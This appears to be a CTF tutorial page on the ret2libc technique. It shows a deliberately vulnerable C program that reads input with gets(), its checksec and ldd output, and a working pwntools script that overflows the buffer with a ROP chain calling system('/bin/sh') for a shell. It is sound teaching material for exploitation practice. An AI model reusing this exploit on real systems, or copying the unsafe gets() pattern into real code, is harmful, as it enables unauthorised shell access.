# Ret2libc

The code is the same as shellcode, but the executable is different.

```c
#include <stdio.h>
int main(){
    char name[100];
    fputs("Enter name: ", stdout);
    gets(name);
    fputs("Hello: ", stdout);
    puts(name);
    return 0;
}
```

Compile: `gcc chal.c -o chal -no-pie`

ASLR disabled.

If we run `checksec chal`, we find that the executable has NX enabled. If we try to run the script from shellcode, we get a segfault. What can we do now?

```
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
```

## libc

Libc provides code for the C standard library. It is a shared object that is typically provided with the challenge. Before we do any exploitation, we first need to find out which version of libc we are using and where it is located in the executable. We can use `ldd` to find out this information.

```
➜ ldd chal      
linux-vdso.so.1 (0x00007ffff7fd0000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007ffff7df0000)
/lib64/ld-linux-x86-64.so.2 (0x00007ffff7fd2000)
```

#### Important note

- In a CTF, libc version on server is probably different
- See [ret2libc-aslr](ret2libc-aslr.md) for leaking libc version

After we've got this information, exploiting is actually really simple with pwntools.

```python
from pwn import *

p = process("./chal")
e = ELF("./chal", checksec=False)
context.binary = e
rop = ROP(e)
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6", checksec=False)
libc.address = 0x00007ffff7df0000
binsh = next(libc.search(b"/bin/sh"))
sys = libc.symbols["system"]
rop.call(sys,(binsh,))

p.sendline(b"a"*120+rop.chain())
p.interactive()
```

See [rop.md](rop.md) for an explanation of how this works.

